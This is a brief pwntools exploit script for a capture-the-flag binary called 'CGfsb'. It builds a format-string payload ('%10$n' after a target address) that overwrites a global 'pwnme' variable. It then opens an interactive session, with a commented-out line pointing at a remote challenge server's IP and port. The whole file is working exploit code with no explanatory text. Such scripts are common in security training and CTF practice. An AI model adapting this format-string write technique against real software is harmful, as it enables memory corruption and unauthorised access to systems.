from pwn import *
p=process('./CGfsb')
#p=remote('111.200.241.244',52117)
pwnme_addr=0x0804A068 
payload=p32(pwnme_addr)+'aaaa'+'%10$n'
p.recvuntil("please tell me your name:\n")
p.sendline('Sakura')
p.recvuntil("leave your message please:\n")
p.sendline(payload)
p.interactive()
p.close()

